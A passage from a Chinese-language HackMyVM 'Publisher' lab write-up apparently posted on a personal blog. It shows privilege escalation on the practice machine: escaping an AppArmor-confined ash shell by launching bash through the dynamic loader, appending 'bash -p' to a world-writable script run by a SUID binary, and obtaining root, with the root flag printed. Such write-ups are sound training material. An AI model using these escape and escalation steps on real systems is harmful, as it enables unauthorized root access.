                                                                                                                                          \n.strtab                                                                                                                                                      \n.shstrtab                                                                                                                                                    \n.interp                                                                                                                                                      \n.note.gnu.property                                                                                                                                           \n.note.gnu.build-id                                                                                                                                           \n.note.ABI-tag                                                                                                                                                \n.gnu.hash                                                                                                                                                    \n.dynsym                                                                                                                                                      \n.dynstr                                                                                                                                                      \n.gnu.version                                                                                                                                                 \n.gnu.version_r                                                                                                                                               \n.rela.dyn                                                                                                                                                    \n.rela.plt                                                                                                                                                    \n.init                                 \n.plt.got                                                                      \n.plt.sec                                                                      \n.text                      \n.fini    \n.rodata                    \n.eh_frame_hdr                 \n.eh_frame          \n.init_array      \n.fini_array   \n.dynamic    \n.data                      \n.bss           \n.comment  \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现关键字 \u003ccode\u003e/opt/run_container.sh\u003c/code\u003e  \u003ccode\u003e/lib64/ld-linux-x86-64.so.2\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e应该是 \u003ccode\u003erun_container\u003c/code\u003e 会执行\u003ccode\u003erun_container.sh\u003c/code\u003e ，看看\u003ccode\u003erun_container.sh\u003c/code\u003e 是否有修改权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ethink@publisher:/usr/lib64$ ls -al /opt/run_container.sh\n-rwxrwxrwx \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e1715\u003c/span\u003e Mar \u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e /opt/run_container.sh\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试修改，无法修改\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ethink@publisher:/usr/lib64$ echo \u003cspan class=\"hljs-string\"\u003e\"bash -p\"\u003c/span\u003e \u003e\u003e /opt/run_container.sh\n-ash: /opt/run_container.sh: Permission denied\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e没懂怎么利用，看了作者的\u003ccode\u003eWP\u003c/code\u003e （你们的\u003ccode\u003eesay\u003c/code\u003e好难）\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e首先我们可以看到\u003cem\u003e\u003cstrong\u003eAppArmor\u003c/strong\u003e\u003c/em\u003e已\u003cem\u003e\u003cstrong\u003e启用\u003c/strong\u003e\u003c/em\u003e：\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMPublisher/image23.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后我们注意到我们的shell不是\u003cstrong\u003ebash\u003c/strong\u003e而是\u003cstrong\u003eash：\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMPublisher/image24.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后我们还看到我们当前的 shell有一个\u003cstrong\u003eAppArmor配置文件：\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://miro.medium.com/v2/resize:fit:777/0*pGAUT27loR_WNe7d\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e才看到现在的\u003ccode\u003eshell\u003c/code\u003e不是\u003ccode\u003ebash\u003c/code\u003e，而是\u003ccode\u003eash\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ethink@publisher:/usr/lib64$ env\nSHELL=/usr/sbin/ash\n\u003c/code\u003e\u003c/pre\u003e\n\u003cblockquote\u003e\n\u003cp\u003e我已经使用内核库来生成不受限制的 bash shell：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/lib/x86_64-linux-gnu/ld-linux-x86–64.so.2 /bin/bash\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e执行此命令时，它会使用指定的\u003cstrong\u003e动态链接器/加载器\u003c/strong\u003e( \u003cstrong\u003eld-linux-x86–64.so.2\u003c/strong\u003e ) 来加载所需的共享库并启动**/bin/bash** shell。这种使用二进制文件直接调用链接器/加载器的方法是一种通过明确指定要用于该特定二进制文件的动态链接器/加载器来执行二进制文件的方法\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e我们拥有对\u003ccode\u003e/lib/x86_64-linux-gnu/ld-linux-x86–64.so.2\u003c/code\u003e拥有完全的权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ethink@publisher:/usr/lib64$ ls -al /usr/lib/x86_64-linux-gnu/ld-linux-x86-\u003cspan class=\"hljs-number\"\u003e64.\u003c/span\u003eso\u003cspan class=\"hljs-number\"\u003e.2\u003c/span\u003e \nlrwxrwxrwx \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e Nov \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e /usr/lib/x86_64-linux-gnu/ld-linux-x86-\u003cspan class=\"hljs-number\"\u003e64.\u003c/span\u003eso\u003cspan class=\"hljs-number\"\u003e.2\u003c/span\u003e -\u003e ld-\u003cspan class=\"hljs-number\"\u003e2.31\u003c/span\u003e.so\n\u003c/code\u003e\u003c/pre\u003e\n\u003cblockquote\u003e\n\u003cp\u003e然后我在脚本中添加了“ \u003cstrong\u003ebash -p”并运行了SUID\u003c/strong\u003e二进制文件\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ethink@publisher:/usr/lib64$ echo \u003cspan class=\"hljs-string\"\u003e\"bash -p\"\u003c/span\u003e \u003e\u003e /opt/run_container.sh \nthink@publisher:/usr/lib64$ /usr/sbin/run_container \n\u003cspan class=\"hljs-type\"\u003eList\u003c/span\u003e of Docker containers:\nID: 41c976e507f8 | Name: jovial_hertz | Status: Up \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e hours\n\nEnter the ID of the container \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e leave blank to create a new one: \n/opt/run_container.sh: line \u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e: validate_container_id: command \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e found \n\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e) Start Container\n\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e) Stop Container\n\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e) Restart Container\n\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e) Create Container\n\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e) Quit\nChoose an action \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e a container: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\nError response \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e daemon: page \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e found\nError: failed to start containers: \nbash-\u003cspan class=\"hljs-number\"\u003e5.0\u003c/span\u003e\u003cspan class=\"hljs-comment\"\u003e# \u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e获得\u003ccode\u003eROOT\u003c/code\u003e权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ebash-\u003cspan class=\"hljs-number\"\u003e5.0\u003c/span\u003e\u003cspan class=\"hljs-comment\"\u003e# id\u003c/span\u003e\nuid=\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e(think) gid=\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e(think) euid=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root) egid=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root) groups=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root),\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e(think)\nbash-\u003cspan class=\"hljs-number\"\u003e5.0\u003c/span\u003e\u003cspan class=\"hljs-comment\"\u003e#\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eRootFlag\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ebash-\u003cspan class=\"hljs-number\"\u003e5.0\u003c/span\u003e\u003cspan class=\"hljs-comment\"\u003e# cat root.txt\u003c/span\u003e\n3a4225cc9e85709adda6ef55d6a4f2ca \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e为什么OPT不可以访问呢？\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://zhuanlan.zhihu.com/p/547772872\"\u003ehttps://zhuanlan.zhihu.com/p/547772872\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e首先我们的\u003ccode\u003eshell\u003c/code\u003e是\u003ccode\u003eASH\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e其次是\u003ccode\u003eapparmor\u003c/code\u003e 限制了，\u003ccode\u003eapparmor\u003c/code\u003e 可以对程序进行访问控制，靶机里就是限制呢我们的\u003ccode\u003eshell\u003c/code\u003e \u003ccode\u003eASH\u003c/code\u003e ，下面是对ASH限制的配置文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ebash-\u003cspan class=\"hljs-number\"\u003e5.0\u003c/span\u003e\u003cspan class=\"hljs-comment\"\u003e# cd /etc/apparmor.d/\u003c/span\u003e\nbash-\u003cspan class=\"hljs-number\"\u003e5.0\u003c/span\u003e\u003cspan class=\"hljs-comment\"\u003e# ls\u003c/span\u003e\nabi           disable         local        nvidia_modprobe  tunables     usr.sbin.ash       usr.sbin.mysqld    usr.sbin.tcpdump\nabstractions  force-complain  lsb_release  sbin.dhclient    usr.\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e.man  usr.sbin.ippusbxd  usr.sbin.rsyslogd\nbash-\u003cspan class=\"hljs-number\"\u003e5.0\u003c/span\u003e\u003cspan class=\"hljs-comment\"\u003e# cat usr.sbin.ash \u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#include \u0026#x3C;tunables/global\u003e\u003c/span\u003e\n\n/usr/sbin/ash flags=(complain) {\n  \u003cspan class=\"hljs-comment\"\u003e#include \u0026#x3C;abstractions/base\u003e\u003c/span\u003e\n  \u003cspan class=\"hljs-comment\"\u003e#include \u0026#x3C;abstractions/bash\u003e\u003c/span\u003e\n  \u003cspan class=\"hljs-comment\"\u003e#include \u0026#x3C;abstractions/consoles\u003e\u003c/span\u003e\n  \u003cspan class=\"hljs-comment\"\u003e#include \u0026#x3C;abstractions/nameservice\u003e\u003c/span\u003e\n  \u003cspan class=\"hljs-comment\"\u003e#include \u0026#x3C;abstractions/user-tmp\u003e\u003c/span\u003e\n\n  \u003cspan class=\"hljs-comment\"\u003e# Remove specific file path rules\u003c/span\u003e\n  \u003cspan class=\"hljs-comment\"\u003e# Deny access to certain directories\u003c/span\u003e\n  deny /opt/ r,\n  deny /opt/** rwx,\n  /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/** mrix,\n  /usr/sbin/** mrix,\n\n  \u003cspan class=\"hljs-comment\"\u003e# Simplified rule for accessing /home directory\u003c/span\u003e\n  owner /home/** rwix,\n}\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以看到是 \u003ccode\u003edeny /opt/ r\u003c/code\u003e  \u003ccode\u003edeny /opt/** rwx\u003c/code\u003e，限制了我们对\u003ccode\u003eOPT\u003c/code\u003e文件夹里边的文件的所有权限\u003c/p\u003e\n\u003cp\u003e因此我们通过动态链接库回到 \u003ccode\u003ebash\u003c/code\u003e 环境后，改配置文件就对我们不起效了\u003c/p\u003e","title":"HackMyVM - Publisher","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["HackMyVM","Linux靶机"],"categories":"靶机","description":"Publisher. https://hackmyvm.eu/machines/machine.php?vm=Publisher Notes: I hope you will enjoy it. 信息收集 新装了DVWS尝试一下，结果和nmap扫描的差不多 渗透 因为此只存在80端口和22端口，所以..."},"recentPosts":[{"id":"Machinevictorique","title":"Machine - victorique","date":"2025-12-13","isEncrypted":true,"year":"2025","month":"12","day":"13"},{"id":"TheHackersLabsKoi Stealer","title":"TheHackersLabs - Koi Stealer","date":"2025-12-06","isEncrypted":false,"year":"2025","month":"12","day":"06"},{"id":"HackMyVMSkid","title":"HackMyVM - Skid","date":"2025-12-03","isEncrypted":false,"year":"2025","month":"12","day":"03"},{"id":"群U靶机SudoHome_sunset","title":"群U靶机 - SudoHome","date":"2025-11-23","isEncrypted":false,"year":"2025","month":"11","day":"24"},{"id":"群U靶机Yibasuo","title":"群U靶机 - Yibasuo","date":"2025-11-22","isEncrypted":false,"year":"2025","month":"11","day":"24"},{"id":"HackMyVMHunter","title":"HackMyVM - Hunter","date":"2025-11-21","isEncrypted":false,"year":"2025","month":"11","day":"21"},{"id":"HackTheBoxSeason9 - NanoCorp","title":"HackTheBox - Season9 - NanoCorp","date":"2025-11-14","isEncrypted":true,"year":"2025","month":"11","day":"14"}]},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"04","day":"03","id":"HackMyVMPublisher"},"buildId":"rO8NqlxOMnvvJBFiroi4I","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>
